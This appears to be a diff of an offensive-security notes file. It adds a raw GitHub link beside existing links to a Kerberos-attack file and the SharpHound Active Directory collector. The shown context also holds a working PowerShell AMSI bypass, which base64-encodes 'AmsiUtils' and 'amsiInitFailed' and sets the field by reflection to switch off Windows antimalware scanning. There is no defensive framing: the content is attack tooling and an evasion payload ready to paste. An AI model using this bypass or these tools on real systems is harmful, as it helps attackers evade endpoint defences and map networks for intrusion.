@@ -12,6 +12,8 @@ https://raw.githubusercontent.com/vinicius-batistella/Rumo/refs/heads/main/kerb.
 
 https://raw.githubusercontent.com/BloodHoundAD/BloodHound/refs/heads/master/Collectors/SharpHound.ps1
 
+https://raw.githubusercontent.com/vinicius-batistella/Rumo/refs/heads/main/blood.txt
+
 ==============================================================================================================================
 
 [Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
